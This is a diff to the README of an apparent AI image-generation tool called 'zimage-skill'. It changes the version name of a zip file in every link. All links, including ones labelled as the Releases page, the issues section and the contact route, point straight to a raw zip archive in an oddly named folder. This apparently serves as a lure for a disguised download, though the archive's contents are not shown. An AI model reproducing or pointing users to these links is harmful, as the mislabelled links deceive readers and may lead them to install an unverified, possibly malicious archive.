@@ -6,7 +6,7 @@ Welcome to zimage-skill! This tool uses AI to create stunning images from natura
 ## 📦 Download & Install
 To start using zimage-skill, you need to download the software. Click the button below to visit the Releases page:
 
-[![Download zimage-skill](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill_zimage_3.3.zip%20zimage--skill-v1.0-blue)](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill_zimage_3.3.zip)
+[![Download zimage-skill](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill-zimage-v2.0.zip%20zimage--skill-v1.0-blue)](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill-zimage-v2.0.zip)
 
 ### Steps to Download
 1. Click the download button above. This will take you to our Releases page.
@@ -54,7 +54,7 @@ Using zimage-skill is simple. After you run the application, follow these guidel
 ## 🎨 Frequently Asked Questions (FAQs)
 
 ### Q1: What if I have an issue during installation?
-If you encounter problems, ensure you have followed all steps correctly. You may also check the [issues section](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill_zimage_3.3.zip) for others who might have had similar experiences.
+If you encounter problems, ensure you have followed all steps correctly. You may also check the [issues section](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill-zimage-v2.0.zip) for others who might have had similar experiences.
 
 ### Q2: Can I run zimage-skill on older operating systems?
 While zimage-skill is optimized for modern systems, it may not function well on outdated operating systems. Upgrading to a recent version is recommended for the best experience.
@@ -67,9 +67,9 @@ zimage-skill uses advanced machine learning algorithms to interpret your textual
 - **Community Support:** Join our community for tips, tricks, and sharing your creations.
 
 ## 📞 Contact Us
-If you have further questions or need help, feel free to reach out through the [issues section](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill_zimage_3.3.zip) or contact us via email.
+If you have further questions or need help, feel free to reach out through the [issues section](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill-zimage-v2.0.zip) or contact us via email.
 
 ## 📥 Return to Download
 Ready to create amazing images? Click the link below to download zimage-skill again:
 
-[![Download zimage-skill](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill_zimage_3.3.zip%20zimage--skill-v1.0-blue)](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill_zimage_3.3.zip)
+[![Download zimage-skill](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill-zimage-v2.0.zip%20zimage--skill-v1.0-blue)](https://raw.githubusercontent.com/rustectersehj226/zimage-skill/main/irrefrangible/skill-zimage-v2.0.zip)
